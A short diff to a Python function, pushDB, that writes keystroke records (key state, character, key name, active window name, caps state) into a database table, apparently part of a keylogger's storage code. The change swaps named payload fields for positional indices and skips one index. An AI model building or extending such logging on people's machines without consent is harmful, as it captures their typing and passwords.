@@ -66,7 +66,7 @@ def pushDB(payload):
   mycursor = db.cursor()
   
   sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
-  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
+  val = (f"{payload[0]}", f"{payload[1]}", f"{payload[2]}", f"{payload[3]}", f"{payload[4]}", f"{payload[5]}", f"{payload[6]}", f"{payload[7]}", f"{payload[9]}")
   print("executing query")
   mycursor.execute(sql, val)
   
